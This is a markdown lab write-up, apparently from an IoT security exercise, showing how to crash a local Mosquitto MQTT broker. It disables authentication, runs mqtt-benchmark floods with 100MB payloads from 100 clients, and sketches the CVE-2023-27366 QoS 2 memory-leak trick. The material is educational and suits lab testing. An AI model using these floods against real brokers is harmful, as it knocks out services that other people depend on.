# MQTT DOS Attack

## Prerequisite

First, we need to remove the authentication so we can connect as many clients as possible. If needed, change the **mosquitto.conf** from ```

```
allow_anonymous false
```

to
```
allow_anonymous true
```

Then, to start the DOS attack we will need to customize our messages payload. To do so, we will use [krylovsk/mqtt-benchmark's](https://github.com/krylovsk/mqtt-benchmark) tool. You can either build the application using GO, or download the .exe in the [release](https://github.com/krylovsk/mqtt-benchmark/releases/tag/v0.2.0) tab (Windows).
### Attack

First, we start the Docker container using :

```
docker-compose up
```


Once downloaded, we can start using the **mqtt-benchmark** tool using this manual : 
``` shell
$ ./mqtt-benchmark -h
Usage of ./mqtt-benchmark:
  -broker string
    	MQTT broker endpoint as scheme://host:port (default "tcp://localhost:1883")
  -broker-ca-cert string
    	Path to broker CA certificate in PEM format
  -client-cert string
    	Path to client certificate in PEM format
  -client-key string
    	Path to private clientKey in PEM format
  -client-prefix string
    	MQTT client id prefix (suffixed with '-<client-num>' (default "mqtt-benchmark")
  -clients int
    	Number of clients to start (default 10)
  -count int
    	Number of messages to send per client (default 100)
  -format string
    	Output format: text|json (default "text")
  -insecure
    	Skip TLS certificate verification
  -message-interval int
    	Time interval in seconds to publish message (default 1)
  -password string
    	MQTT client password (empty if auth disabled)
  -payload string
    	MQTT message payload. If empty, then payload is generated based on the size parameter
  -qos int
    	QoS for published messages (default 1)
  -quiet
    	Suppress logs while running
  -ramp-up-time int
    	Time in seconds to generate clients by default will not wait between load request
  -size int
    	Size of the messages payload (bytes) (default 100)
  -topic string
    	MQTT topic for outgoing messages (default "/test")
  -username string
    	MQTT client username (empty if auth disabled)
  -wait int
    	QoS 1 wait timeout in milliseconds (default 60000)
```

For testing, we try this command : 
``` shell
./mqtt-benchmark --broker tcp://localhost:1883 --count 10 --size 100 --clients 10 --qos 2 --format text
```

And we get this output :

``` shell
======= CLIENT 2 =======
Ratio:               1.000 (10/10)
Runtime (s):         10.011
Msg time min (ms):   1.286
Msg time max (ms):   3.478
Msg time mean (ms):  1.918
Msg time std (ms):   0.710
Bandwidth (msg/sec): 0.999

======= CLIENT 3 =======
Ratio:               1.000 (10/10)
Runtime (s):         10.011
Msg time min (ms):   1.305
Msg time max (ms):   4.008
Msg time mean (ms):  1.936
Msg time std (ms):   0.850
Bandwidth (msg/sec): 0.999

... etc.
```

We see that our broker has no issue handling 10 clients that send 10 messages with a message payload of 100 Bytes.

When we use a payload size of 100MB, with a 100 clients that send 10 messages each, the container has trouble keeping up and crashes. We used this command :

``` shell
./mqtt-benchmark --broker tcp://localhost:1883 --count 10 --size 100000000 --clients 100 --qos 2 --format text
```

and got this output : 
``` shell
...
2023/09/06 15:43:38 CLIENT 84 is connected to the broker tcp://localhost:1883
2023/09/06 15:43:46 CLIENT 20 is connected to the broker tcp://localhost:1883
2023/09/06 15:43:46 CLIENT 13 is connected to the broker tcp://localhost:1883
Killed

$
```

Using an extension that monitors our container, we can see that the CPU is the point of failure here, but the memory can also be critical if there's not enough ressources allocated to the container.

This is the easiest implementation of the DOS Attack, but reading documentation we can create custom MQTT messages that uses the protocol's QoS to crash the container.

### Going Further

There was an update for MQTT brokers recently : 2.0.16 (16/08/2023) that fixed some issues about MQTT. Since it's recent, chances are most of the brokers are not updated, leaving huge risks for attackers.

For previous version, such as 2.0.15, there was a vulnerability that took advantage of MQTT QoS policy that causes the broker to memory leak. 

Put simply, clients could send multiple QoS 2 messages with the same message ID, but then never respond to the PUBREC commands from the broker, leaving the 4 time handshake waiting for an answer. [## CVE-2023-27366](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27366)

This is maybe something that can be tested during IoT exercise, by manufacturing message payloads and not allowing the publisher to respond to PUBREC.